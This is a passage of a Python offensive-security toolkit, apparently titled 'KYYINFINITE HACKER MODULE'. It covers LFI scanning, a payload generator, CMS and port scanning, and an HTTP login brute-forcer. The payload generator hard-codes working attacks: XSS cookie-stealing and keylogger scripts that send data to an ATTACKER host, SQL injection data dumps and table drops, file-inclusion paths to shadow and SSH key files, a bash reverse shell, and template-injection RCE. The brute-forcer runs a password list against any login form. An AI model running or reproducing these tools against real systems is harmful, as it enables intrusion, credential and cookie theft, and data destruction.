        HUI.box_line(w,f" {o.x(213)}Param: {o.WB}{param_name}{o.RST}")
        for payload,desc,signature in lfi_payloads:
            test_params=dict(params)
            test_params[param_name]=[payload]
            query=urllib.parse.urlencode({k:v[0] for k,v in test_params.items()})
            test_url=f"{base}?{query}"

            sys.stdout.write(f"\r    {o.x(245)}{desc[:35]}{' '*20}{o.RST}");sys.stdout.flush()

            body,status,_=http_get(test_url,timeout=8)

            if signature and re.search(signature,body,re.IGNORECASE):
                vulns.append((param_name,payload,desc))
                print(f"\r    {o.RB}☠ LFI FOUND! {o.WB}{desc}{o.RST}{' '*15}")
                HUI.box_line(w,f"   {o.RB}☠ {o.WB}{desc}{o.RST}")
                HUI.box_line(w,f"     {o.x(87)}{payload[:40]}{o.RST}")

    print(f"\r{' '*60}")
    HUI.box_sep(w)
    if vulns:
        HUI.box_line(w,f" {o.RB}☠ {len(vulns)} LFI VULNERABILITIES!{o.RST}")
    else:
        HUI.box_line(w,f" {o.GB}✓ No LFI found{o.RST}")
    HUI.box_empty(w);HUI.box_bottom(w)


# ═══════════════════════════════════════════
#  HACK 07: PAYLOAD GENERATOR
# ═══════════════════════════════════════════
def hack_payload_gen():
    HUI.banner("💣 PAYLOAD GENERATOR & ENCODER")

    print(f"    {o.GB}[{o.WB}1{o.GB}]{o.RST} {o.x(87)}XSS Payloads{o.RST}")
    print(f"    {o.GB}[{o.WB}2{o.GB}]{o.RST} {o.x(87)}SQLi Payloads{o.RST}")
    print(f"    {o.GB}[{o.WB}3{o.GB}]{o.RST} {o.x(87)}LFI/RFI Payloads{o.RST}")
    print(f"    {o.GB}[{o.WB}4{o.GB}]{o.RST} {o.x(87)}Command Injection{o.RST}")
    print(f"    {o.GB}[{o.WB}5{o.GB}]{o.RST} {o.x(87)}SSTI Payloads{o.RST}")
    print(f"    {o.GB}[{o.WB}6{o.GB}]{o.RST} {o.x(87)}Custom Payload Encoder{o.RST}")
    print()
    ch=HUI.inp("Choose [1-6]");print(o.RST)

    payloads={}
    if ch=='1':
        payloads={
            "Basic Alert":'<script>alert("XSS")</script>',
            "IMG Error":'<img src=x onerror=alert(1)>',
            "SVG Onload":'<svg onload=alert(1)>',
            "Body Onload":'<body onload=alert(1)>',
            "Input Focus":'<input onfocus=alert(1) autofocus>',
            "Cookie Steal":f'<script>new Image().src="http://ATTACKER/steal?c="+document.cookie</script>',
            "Keylogger":'<script>document.onkeypress=function(e){new Image().src="http://ATTACKER/log?k="+e.key}</script>',
            "DOM XSS":'"><script>document.location="http://ATTACKER/steal?c="+document.cookie</script>',
            "Event Handler":"'\"><details open ontoggle=alert(1)>",
            "Polyglot":"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            "WAF Bypass 1":"<ScRiPt>alert(1)</ScRiPt>",
            "WAF Bypass 2":"<scr<script>ipt>alert(1)</scr</script>ipt>",
            "No Quotes":"<img src=x onerror=alert`1`>",
            "Fetch Steal":'<script>fetch("http://ATTACKER/steal?c="+document.cookie)</script>',
        }
    elif ch=='2':
        payloads={
            "OR 1=1":"' OR '1'='1'--",
            "Union Select":"' UNION SELECT 1,2,3,4--",
            "Version":"' UNION SELECT NULL,@@version--",
            "Tables":"' UNION SELECT NULL,GROUP_CONCAT(table_name) FROM information_schema.tables--",
            "Columns":"' UNION SELECT NULL,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--",
            "Data Dump":"' UNION SELECT username,password FROM users--",
            "Time Blind":"' AND SLEEP(5)--",
            "Error Based":"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "Stacked":"'; DROP TABLE users;--",
            "Login Bypass":"admin' OR '1'='1'--",
            "No Spaces":"'/**/OR/**/1=1--",
            "Hex Encode":"' OR 0x31=0x31--",
        }
    elif ch=='3':
        payloads={
            "Linux passwd":"../../../etc/passwd",
            "Windows hosts":"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "PHP filter":"php://filter/convert.base64-encode/resource=index.php",
            "Null byte":"../../../etc/passwd%00",
            "Double encode":"..%252f..%252f..%252fetc%252fpasswd",
            "Proc environ":"../../../proc/self/environ",
            "Apache log":"../../../var/log/apache2/access.log",
            "SSH keys":"../../../root/.ssh/id_rsa",
            "Shadow":"../../../etc/shadow",
            "PHP input":"php://input",
        }
    elif ch=='4':
        payloads={
            "Basic":"; id","Pipe":"| id","Backtick":"`id`",
            "Newline":"%0aid","AND":"&& id","OR":"|| id",
            "Subshell":"$(id)","Encoded":"%3Bid","Curl OOB":"; curl http://ATTACKER/$(id)",
            "Wget OOB":"; wget http://ATTACKER/$(whoami)","Reverse":"| bash -i >& /dev/tcp/ATTACKER/4444 0>&1",
            "Base64 exec":"echo aWQ= | base64 -d | bash",
        }
    elif ch=='5':
        payloads={
            "Jinja2 basic":"{{7*7}}","Jinja2 RCE":"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "Twig":"{{7*'7'}}","Smarty":"{php}echo `id`;{/php}",
            "Mako":"${7*7}","Freemarker":"${7*7}",
            "ERB":"<%= 7*7 %>","Pebble":"{% set cmd = 'id' %}",
            "Velocity":"#set($x=7*7)$x","Thymeleaf":"[[${7*7}]]",
        }
    elif ch=='6':
        raw=HUI.inp("Enter payload to encode");print(o.RST)
        if raw:
            w=52;HUI.box_top(w,"ENCODED PAYLOADS");HUI.box_empty(w)
            encodings=[
                ("Original",raw),
                ("URL Encode",urllib.parse.quote(raw)),
                ("Double URL",urllib.parse.quote(urllib.parse.quote(raw))),
                ("Base64",base64.b64encode(raw.encode()).decode()),
                ("Hex",''.join(f'%{ord(c):02x}' for c in raw)),
                ("Unicode",''.join(f'\\u{ord(c):04x}' for c in raw)),
                ("HTML Entity",''.join(f'&#{ord(c)};' for c in raw)),
                ("Hex Entity",''.join(f'&#x{ord(c):x};' for c in raw)),
                ("Octal",' '.join(f'{ord(c):o}' for c in raw)),
                ("Binary",' '.join(format(ord(c),'08b') for c in raw)),
                ("Char Codes",'+'.join(f'String.fromCharCode({ord(c)})' for c in raw[:10])),
                ("Reverse",raw[::-1]),
            ]
            for name,encoded in encodings:
                HUI.box_line(w,f" {o.YB}{name}{o.RST}")
                for i in range(0,len(encoded),42):
                    HUI.box_line(w,f"   {o.x(87)}{encoded[i:i+42]}{o.RST}")
            HUI.box_empty(w);HUI.box_bottom(w)
        return

    if payloads:
        w=56;HUI.box_top(w,"GENERATED PAYLOADS");HUI.box_empty(w)
        for name,payload in payloads.items():
            HUI.box_line(w,f" {o.x(208)}▸ {o.WB}{name}{o.RST}")
            for i in range(0,len(payload),46):
                HUI.box_line(w,f"   {o.x(87)}{payload[i:i+46]}{o.RST}")
            HUI.box_line(w,"")
        HUI.box_sep(w)

        # Export
        HUI.box_line(w,f" {o.x(245)}Total: {len(payloads)} payloads{o.RST}")
        HUI.box_empty(w);HUI.box_bottom(w)

        print()
        exp=HUI.inp("Export to file? [y/n]");print(o.RST)
        if exp.lower()=='y':
            fp=os.path.expanduser(f"~/payloads_{int(time.time())}.txt")
            with open(fp,'w') as f:
                for name,payload in payloads.items():
                    f.write(f"# {name}\n{payload}\n\n")
            HUI.ok(f"Saved: {fp}")


# ═══════════════════════════════════════════
#  HACK 08: CMS VULNERABILITY SCANNER
# ═══════════════════════════════════════════
def hack_cms_scanner():
    HUI.banner("🔍 CMS VULNERABILITY SCANNER")
    url=HUI.inp("Target URL");print(o.RST)
    if not url:HUI.fail("Empty!");return
    if not url.startswith('http'):url='https://'+url
    url=url.rstrip('/')

    HUI.spin("Detecting CMS & scanning...",3)

    body,status,headers=http_get(url)
    body_lower=body.lower()
    server=headers.get('Server','').lower() if headers else ''

    cms_detected=""
    cms_version=""
    vulns=[]

    # WordPress Detection
    wp_indicators=['wp-content','wp-includes','wp-json','wordpress','wp-login']
    if any(ind in body_lower for ind in wp_indicators):
        cms_detected="WordPress"
        # Version
        ver=re.search(r'content="WordPress\s*([\d.]+)"',body)
        if ver:cms_version=ver.group(1)
        ver2=re.search(r'ver=([\d.]+)',body)
        if not cms_version and ver2:cms_version=ver2.group(1)

        # Check vulnerabilities
        checks={
            '/wp-json/wp/v2/users':('User enumeration','Users API exposed'),
            '/wp-login.php':('Login page exposed','Brute force possible'),
            '/xmlrpc.php':('XML-RPC enabled','DDoS amplification possible'),
            '/wp-config.php.bak':('Config backup','Credentials exposure'),
            '/wp-content/debug.log':('Debug log','Information disclosure'),
            '/.wp-config.php.swp':('Swap file','Credentials exposure'),
            '/wp-content/uploads/':('Upload directory listing','File exposure'),
            '/readme.html':('Readme file','Version disclosure'),
            '/license.txt':('License file','CMS confirmation'),
        }

        for path,(name,risk) in checks.items():
            _,s,_=http_get(url+path,timeout=5)
            if s in (200,):
                vulns.append((name,risk,path,s))

    # Joomla Detection
    elif 'joomla' in body_lower or '/media/jui/' in body_lower:
        cms_detected="Joomla"
        checks={
            '/administrator/':('Admin panel','Exposed'),
            '/configuration.php.bak':('Config backup','Credentials'),
            '/htaccess.txt':('Htaccess','Config disclosure'),
            '/api/index.php/v1/config/application':('API config','Info disclosure'),
        }
        for path,(name,risk) in checks.items():
            _,s,_=http_get(url+path,timeout=5)
            if s in (200,):vulns.append((name,risk,path,s))

    # Drupal Detection
    elif 'drupal' in body_lower or 'sites/default' in body_lower:
        cms_detected="Drupal"
        checks={
            '/CHANGELOG.txt':('Changelog','Version disclosure'),
            '/user/login':('Login page','Exposed'),
            '/admin/':('Admin panel','Exposed'),
            '/core/CHANGELOG.txt':('Core changelog','Version'),
        }
        for path,(name,risk) in checks.items():
            _,s,_=http_get(url+path,timeout=5)
            if s in (200,):vulns.append((name,risk,path,s))

    # Laravel
    elif 'laravel' in body_lower or 'csrf-token' in body_lower:
        cms_detected="Laravel"
        checks={
            '/.env':('Environment file','CRITICAL - Credentials'),
            '/storage/logs/laravel.log':('Log file','Info disclosure'),
            '/telescope':('Telescope debug','Info disclosure'),
            '/_debugbar':('Debug bar','Info disclosure'),
        }
        for path,(name,risk) in checks.items():
            _,s,_=http_get(url+path,timeout=5)
            if s in (200,):vulns.append((name,risk,path,s))

    else:
        # Generic checks
        cms_detected="Unknown CMS"
        checks={
            '/.env':('Env file','Credentials'),
            '/.git/HEAD':('Git exposed','Source code leak'),
            '/.svn/entries':('SVN exposed','Source leak'),
            '/robots.txt':('Robots','Info disclosure'),
            '/sitemap.xml':('Sitemap','Structure'),
            '/server-info':('Server info','Info disclosure'),
            '/server-status':('Server status','Info disclosure'),
            '/info.php':('PHP Info','Info disclosure'),
            '/phpinfo.php':('PHP Info','Info disclosure'),
            '/.well-known/security.txt':('Security.txt','Contact info'),
            '/crossdomain.xml':('Crossdomain','CORS policy'),
        }
        for path,(name,risk) in checks.items():
            b,s,_=http_get(url+path,timeout=5)
            if s==200 and len(b)>50:vulns.append((name,risk,path,s))

    # Display
    w=52;HUI.box_top(w,"CMS SCAN RESULTS");HUI.box_empty(w)
    HUI.box_line(w,f" {o.YB}Target  {o.x(245)}: {o.x(87)}{url[:35]}{o.RST}")
    HUI.box_line(w,f" {o.YB}CMS     {o.x(245)}: {o.x(208)}{cms_detected}{o.RST}")
    if cms_version:
        HUI.box_line(w,f" {o.YB}Version {o.x(245)}: {o.x(208)}{cms_version}{o.RST}")
    HUI.box_line(w,f" {o.YB}Server  {o.x(245)}: {o.x(87)}{server or 'Hidden'}{o.RST}")
    HUI.box_sep(w)

    if vulns:
        HUI.box_line(w,f" {o.RB}☠ VULNERABILITIES ({len(vulns)}){o.RST}")
        for name,risk,path,status in vulns:
            severity_color=o.RB if 'CRITICAL' in risk else o.YB
            HUI.box_line(w,f"   {severity_color}● {o.WB}{name}{o.RST}")
            HUI.box_line(w,f"     {o.x(245)}Risk: {severity_color}{risk}{o.RST}")
            HUI.box_line(w,f"     {o.x(245)}Path: {o.x(87)}{path}{o.RST}")
    else:
        HUI.box_line(w,f" {o.GB}✓ No obvious vulnerabilities{o.RST}")

    HUI.box_empty(w);HUI.box_bottom(w)


# ═══════════════════════════════════════════
#  HACK 09: HTTP BRUTE FORCE
# ═══════════════════════════════════════════
def hack_brute_force():
    HUI.banner("🔨 HTTP LOGIN BRUTE FORCE")
    HUI.warn("Only test systems you own or have permission!")
    print()

    url=HUI.inp("Login URL (e.g. http://site.com/login)")
    user_field=HUI.inp("Username field name (default: username)")
    pass_field=HUI.inp("Password field name (default: password)")
    username=HUI.inp("Username to test")
    fail_text=HUI.inp("Failure text (e.g. 'Invalid' or 'incorrect')")
    print(o.RST)

    user_field=user_field or 'username'
    pass_field=pass_field or 'password'
    fail_text=fail_text or 'invalid'

    if not url or not username:HUI.fail("URL and username required!");return

    passwords=[
        "password","123456","admin","root","12345678","qwerty",
        "letmein","welcome","monkey","dragon","master","login",
        "abc123","111111","admin123","password1","password123",
        "1234567890","iloveyou","sunshine","princess","football",
        "shadow","superman","trustno1","qwerty123","654321",
        username,username+"1",username+"123",username+"!",
        username+"2024",username+"2025",username.capitalize(),
        f"{username}@123","P@ssw0rd","Pass1234","Admin@123",
        "test","test123","guest","demo","user","changeme",
    ]

    wl=HUI.inp("Custom wordlist path (ENTER for built-in)");print(o.RST)
    if wl and os.path.isfile(wl):
        with open(wl,'r',errors='ignore') as f:
            passwords=[l.strip() for l in f if l.strip()]
        HUI.info(f"Loaded {len(passwords)} passwords")

    HUI.progress(f"Brute forcing ({len(passwords)} passwords)...",2);print()

    w=52;HUI.box_top(w,"BRUTE FORCE");HUI.box_empty(w)
    HUI.box_line(w,f" {o.YB}URL      {o.x(245)}: {o.x(87)}{url[:35]}{o.RST}")
    HUI.box_line(w,f" {o.YB}Username {o.x(245)}: {o.x(87)}{username}{o.RST}")
    HUI.box_line(w,f" {o.YB}Wordlist {o.x(245)}: {o.x(87)}{len(passwords)} passwords{o.RST}")
    HUI.box_sep(w)

    found=False
    for i,pwd in enumerate(passwords,1):
        sys.stdout.write(f"\r    {o.x(245)}[{i}/{len(passwords)}] {pwd[:20]}{' '*20}{o.RST}");sys.stdout.flush()

        data=urllib.parse.urlencode({user_field:username,pass_field:pwd}).encode()
        try:
            req=urllib.request.Request(url,data=data,method='POST')
            req.add_header('User-Agent','Mozilla/5.0')
            req.add_header('Content-Type','application/x-www-form-urlencoded')
            with urllib.request.urlopen(req,timeout=10) as resp:
                rbody=resp.read().decode('utf-8',errors='ignore')
                if fail_text.lower() not in rbody.lower():
                    found=True
                    print(f"\r{' '*60}")
                    HUI.box_line(w,f" {o.RB}☠ PASSWORD FOUND!{o.RST}")
                    HUI.box_line(w,f"   {o.YB}Username: {o.GB}{username}{o.RST}")
                    HUI.box_line(w,f"   {o.YB}Password: {o.RB}{o.BLD}{pwd}{o.RST}")
                    HUI.box_line(w,f"   {o.YB}Attempt : {o.x(87)}#{i}{o.RST}")
                    break
        except:pass

    if not found:
        print(f"\r{' '*60}")
        HUI.box_line(w,f" {o.GB}✓ Password not found in wordlist{o.RST}")

    HUI.box_empty(w);HUI.box_bottom(w)


# ═══════════════════════════════════════════
#  HACK 10: NETWORK VULNERABILITY SCANNER
# ═══════════════════════════════════════════
def hack_vuln_scanner():
    HUI.banner("🔬 NETWORK VULNERABILITY SCANNER")
    target=HUI.inp("Target IP/Host");print(o.RST)
    if not target:HUI.fail("Empty!");return

    common_ports={
        21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',
        80:'HTTP',110:'POP3',143:'IMAP',443:'HTTPS',445:'SMB',
        993:'IMAPS',995:'POP3S',1433:'MSSQL',1521:'Oracle',
        3306:'MySQL',3389:'RDP',5432:'PostgreSQL',5900:'VNC',
        6379:'Redis',8080:'HTTP-Proxy',8443:'HTTPS-Alt',
        9200:'Elasticsearch',27017:'MongoDB',11211:'Memcached',
    }

    HUI.progress("Scanning ports & grabbing banners...",2);print()

    w=56;HUI.box_top(w,f"VULN SCAN — {target}");HUI.box_empty(w)

    results=[]
    for port,service in common_ports.items():
        sys.stdout.write(f"\r    {o.x(245)}Scanning port {port} ({service}){' '*15}{o.RST}");sys.stdout.flush()

        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(2)
        try:
            result=sock.connect_ex((target,port))
            if result==0:
                banner=""
                try:
                    if port not in (443,8443):
                        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                        banner=sock.recv(1024).decode('utf-8',errors='ignore').strip()[:100]
                except:pass

                vuln_info=[]
                # Check for known vulnerabilities
                if port==21:vuln_info.append("Anonymous FTP login possible?")
                if port==22:
                    if banner and any(v in banner.lower() for v in ['openssh 5','openssh 6','openssh 7.0','openssh 7.1']):
                        vuln_info.append("Outdated SSH version!")
                if port==23:vuln_info.append("⚠ Telnet is unencrypted!")
                if port==445:vuln_info.append("⚠ SMB exposed - check EternalBlue")
                if port==3389:vuln_info.append("⚠ RDP exposed - check BlueKeep")
                if port==6379:vuln_info.append("⚠ Redis exposed - auth check")
                if port==9200:vuln_info.append("⚠ Elasticsearch exposed")
                if port==27017:vuln_info.append("⚠ MongoDB exposed - auth check")
                if port==11211:vuln_info.append("⚠ Memcached exposed - DDoS amp")

                results.append((port,service,banner,vuln_info))
                print(f"\r    {o.GB}[OPEN] {o.WB}:{port} {o.x(87)}{service}{o.RST}{' '*20}")
        except:pass
        finally:sock.close()

    print(f"\r{' '*60}")
    HUI.box_sep(w)

    if results:
        HUI.box_line(w,f" {o.x(213)}OPEN PORTS ({len(results)}){o.RST}")
        for port,service,banner,vulns in results:
            HUI.box_line(w,f"   {o.GB}● {o.WB}:{port} {o.x(87)}{service}{o.RST}")
            if banner:
                HUI.box_line(w,f"     {o.x(245)}Banner: {o.x(87)}{banner[:35]}{o.RST}")
            for v in vulns:
                HUI.box_line(w,f"     {o.RB}{v[:40]}{o.RST}")
    else:
        HUI.box_line(w,f" {o.x(245)}No open ports found{o.RST}")

    HUI.box_empty(w);HUI.box_bottom(w)


# ═══════════════════════════════════════════
#  MAIN MENU
# ═══════════════════════════════════════════
HTOOLS={
    '1':('💉 SQL Injection Scanner',hack_sqli_scanner),
    '2':('⚡ XSS Vulnerability Scanner',hack_xss_scanner),
    '3':('📂 Directory Bruteforcer',hack_dir_bruteforce),
    '4':('🏴 Subdomain Takeover Checker',hack_subdomain_takeover),
    '5':('🛡️ WAF Detector & Fingerprinter',hack_waf_detect),
    '6':('📄 LFI/RFI Scanner',hack_lfi_scanner),
    '7':('💣 Payload Generator & Encoder',hack_payload_gen),
    '8':('🔍 CMS Vulnerability Scanner',hack_cms_scanner),
    '9':('🔨 HTTP Login Brute Force',hack_brute_force),
    '10':('🔬 Network Vulnerability Scanner',hack_vuln_scanner),
}

def show_menu():
    os.system('clear')
    HUI.skull()
    print(f"    {o.x(196)}╔══════════════════════════════════════════════════╗{o.RST}")
    print(f"    {o.x(196)}║{o.RST} {o.BLD}{o.x(196)}☠{o.RST} {o.BLD}{o.x(208)}KYYINFINITE HACKER MODULE{o.RST} {o.x(245)}v3.0{o.RST}             {o.x(196)}║{o.RST}")
    print(f"    {o.x(196)}║{o.RST}   {o.x(245)}Advanced Penetration Testing Suite{o.RST}             {o.x(196)}║{o.RST}")
    print(f"    {o.x(196)}╠══════════════════════════════════════════════════╣{o.RST}")
    print(f"    {o.x(196)}║{o.RST}                                                  {o.x(196)}║{o.RST}")
    for key,(name,_) in HTOOLS.items():
        num=f"{int(key):02d}"
        print(f"    {o.x(196)}║{o.RST}  {o.x(196)}[{o.WB}{o.BLD}{num}{o.RST}{o.x(196)}]{o.RST} {o.x(208)}{name}{o.RST}")
    print(f"    {o.x(196)}║{o.RST}                                                  {o.x(196)}║{o.RST}")
    print(f"    {o.x(196)}║{o.RST}  {o.RB}[{o.WB}{o.BLD}00{o.RST}{o.RB}]{o.RST} {o.RB}← Back to Main Menu{o.RST}                     {o.x(196)}║{o.RST}")
    print(f"    {o.x(196)}║{o.RST}                                                  {o.x(196)}║{o.RST}")
    print(f"    {o.x(196)}╚══════════════════════════════════════════════════╝{o.RST}")
    print()
    return HUI.inp("Select tool")

def main():
    # Disclaimer
    if not HUI.disclaimer():
        print(f"\n    {o.RB}Access denied. You must agree to proceed.{o.RST}\n")
        sys.exit(0)

    if len(sys.argv)>1:
        tn=sys.argv[1]
        if tn in HTOOLS:_,fn=HTOOLS[tn];fn();HUI.pause()
        elif tn=='menu':
            while True:
                ch=show_menu();print(o.RST)
                if ch in('00','0','q',''):break
                if ch in HTOOLS:_,fn=HTOOLS[ch];fn();HUI.pause()
                else:HUI.fail("Invalid!");time.sleep(1)
    else:
        while True:
            ch=show_menu();print(o.RST)
            if ch in('00','0','q',''):print(f"\n    {o.x(87)}Returning...{o.RST}\n");break
            if ch in HTOOLS:_,fn=HTOOLS[ch];fn();HUI.pause()
            else:HUI.fail("Invalid!");time.sleep(1)

if __name__=='__main__':main()
